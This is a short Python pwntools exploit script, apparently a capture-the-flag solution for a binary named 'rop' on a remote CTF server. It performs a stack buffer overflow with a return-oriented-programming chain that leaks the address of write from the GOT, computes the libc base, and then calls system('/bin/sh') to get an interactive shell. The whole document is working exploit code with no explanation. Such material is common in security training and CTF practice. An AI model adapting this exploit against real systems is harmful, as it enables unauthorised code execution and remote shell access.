#!/usr/bin/python 
from pwn import * 

context.log_level = 'debug' 
#p = process("./rop") 
p = remote("ctf.j0n9hyun.xyz", 3021) 
#gdb.attach(p) 
elf = ELF("./rop") 
libc = ELF("./libc.so.6") 
#libc = ELF("/lib/i386-linux-gnu/libc.so.6") 
read_plt = elf.plt['read'] 
read_got = elf.got['read'] 
write_plt = elf.plt['write'] 
write_got = elf.got['write'] 
p1ret = 0x804850b 
p3ret = 0x8048509 
vulnerable_function = elf.symbols['vulnerable_function'] 

pay = 'A'*0x88 + 'B'*4 
pay += p32(write_plt) + p32(p3ret) + p32(1) + p32(write_got) + p32(0x4) 
pay += p32(vulnerable_function) 
p.sendline(pay) 

write = u32(p.recv(4)) 
libcBase = write - libc.symbols['write'] 
system = libcBase + libc.symbols['system'] 
binsh = libcBase + list(libc.search("/bin/sh"))[0] 
log.info("write : "+hex(write)) 
log.info("system : "+hex(system)) 
log.info("binsh : "+hex(binsh)) 

pay = 'A'*0x88 + 'B'*4 
pay += p32(system) + p32(p1ret) + p32(binsh) 
p.sendline(pay) 

p.interactive()

